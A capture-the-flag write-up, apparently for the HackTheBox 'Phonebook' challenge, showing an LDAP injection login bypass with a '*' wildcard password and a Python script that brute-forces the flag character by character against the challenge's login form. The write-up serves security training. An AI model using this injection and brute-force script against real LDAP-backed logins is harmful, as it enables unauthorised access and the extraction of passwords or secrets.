# Phonebook

## Difficulty = Easy

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/5e012325-bdd9-4184-9158-3f23a60b77ec)

---

Navigating to the website, we get a login page:

![](https://i.imgur.com/sqmR180.png)

- First of all we view page-source

![](https://i.imgur.com/NDjFIy3.png)

- We can see that the version of **phonebook** has been exposed, which is `phonebook 9.8.2020`
- Pasting this on google should give us more information

![](https://i.imgur.com/ALJAIgQ.png)
Read more from [here](https://portswigger.net/kb/issues/00100500_ldap-injection)

- Since characters like `();,*|&= and whitespaces` should be blocked, let try them out

![](https://i.imgur.com/uSIvzN0.png)

- Nothing works except from `*`, Now we have successfully logged in, let search if we have user **Reese** as said in the login page

- Yes we have user reese, i then started searching for keywords like, r, e and s

![](https://i.imgur.com/IyaFgss.png)
![](https://i.imgur.com/V7dqFm0.png)

- After much enumeration, i notice that i have to bruteforce the login page to get a flag, here is a python script that will help us:

```python
import requests
import string

headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}
url = "http://167.99.84.37:32125/login"

chars = string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

counter = 0
flag = "HTB{"

while True:
    # if all chars are not correct means we previous already found the flag
    if counter == len(chars):
        print(flag + "}")
        break

    # creates something like HTB{a*}
    password = flag + chars[counter] + "*}"
    print("Trying: " + password)

    data = {"username" : "Reese", "password" : password}
    response = requests.post(url, headers=headers, data=data)
    
    if (response.url != url + "?message=Authentication%20failed"):
        # possible flag since we still using * at the end: e.g HTB{abc_*}.
        # append chars[] so that we not need to deal with removing "*}" as compared to if we assign password variable to flag variable
        flag += chars[counter]
        counter = 0
    else:
        # increment the char since we might not have found the right letter
        counter += 1
```

- It worked, we got a flag:

![image](https://github.com/sec-fortress/sec-fortress.github.io/assets/132317714/7074c766-80cb-433d-b17f-e191223a10c1)

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
